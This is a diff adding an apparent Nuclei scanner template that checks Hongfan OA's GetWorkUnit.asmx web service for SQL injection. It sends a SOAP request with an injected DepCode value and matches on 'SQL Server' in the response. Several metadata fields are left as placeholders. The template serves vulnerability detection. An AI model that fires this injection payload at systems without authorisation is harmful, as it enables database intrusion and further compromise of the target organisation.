@@ -1,0 +1,35 @@
+id: hongfan-GetWorkUnit-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 红帆OA GetWorkUnit.asmx sql注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/interface/GetWorkUnit.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: text/xml; charset=utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="
+        http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001
+        /XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetDutyDetail xmlns="http://tempuri.org/">
+        <DepCode>1' and @@version>0;--</DepCode>
+        <DutyDate>string</DutyDate>
+        <DutyName>string</DutyName>
+        </GetDutyDetail>
+        </soap:Body>
+        </soap:Envelope>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'SQL Server'
